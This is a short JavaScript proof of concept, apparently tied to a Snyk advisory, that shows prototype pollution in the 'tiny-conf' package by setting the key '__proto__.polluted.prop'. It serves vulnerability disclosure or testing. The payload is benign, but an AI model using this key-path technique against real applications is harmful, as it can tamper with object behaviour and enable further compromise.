//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
    const tinyConf = require('tiny-conf'); 
    obj = {}

    tinyConf.set('__proto__.polluted.prop', "yes"); 
  